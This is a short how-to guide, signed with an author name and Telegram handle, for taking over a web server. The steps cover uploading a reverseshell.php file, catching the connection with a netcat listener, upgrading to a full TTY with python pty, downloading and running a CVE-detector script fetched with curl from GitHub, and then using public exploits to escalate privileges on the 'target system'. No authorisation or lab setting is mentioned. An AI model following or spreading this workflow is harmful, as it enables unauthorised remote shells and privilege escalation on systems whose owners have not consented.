Reverse Shell & CVE Exploitation Guide
Author: Khayrol Islam
Telegram: @DevidLuice

1. Upload reverseshell.php to Your Host
First, upload your reverseshell.php file to your web server/hosting.

Then open the URL in your browser:

arduino
Copy
Edit
http://your-host.com/reverseshell.php
📸 Example Screenshot:

2. Start Netcat Listener
On your machine, run:

yaml
Copy
Edit
nc -lnvp 1337
3. Enter Your Public IP and Port in reverseshell.php
Input your public IP address and the port (example: 1337) inside the form of reverseshell.php.

📸 Example Screenshot:

4. Receive Reverse Shell
After entering the IP and port, the server will connect back to your machine.

You will get a reverse shell in your Netcat terminal.

5. Upgrade to Full TTY Shell
Once connected, upgrade the shell for better control:

rust
Copy
Edit
python3 -c 'import pty; pty.spawn("/bin/bash")'
(If python3 is not available, try with python.)

6. Download and Run CVE Detector
Download the Linux CVE detector script:

bash
Copy
Edit
curl https://raw.githubusercontent.com/mrTr1cky/linux_priv_Guid-/refs/heads/main/cve-detector.sh -o cve-detector.sh
Make it executable:

bash
Copy
Edit
chmod +x cve-detector.sh
Run the script:

bash
Copy
Edit
./cve-detector.sh
This will scan the system for known vulnerabilities (CVEs).

7. Exploit Detected Vulnerabilities
After getting the list of CVEs from cve-detector.sh,

Find public exploits related to those CVEs,

Use them to escalate privileges on the target system.

🚀 Happy Hacking!
Author: Khayrol Islam
Telegram: @DevidLuice
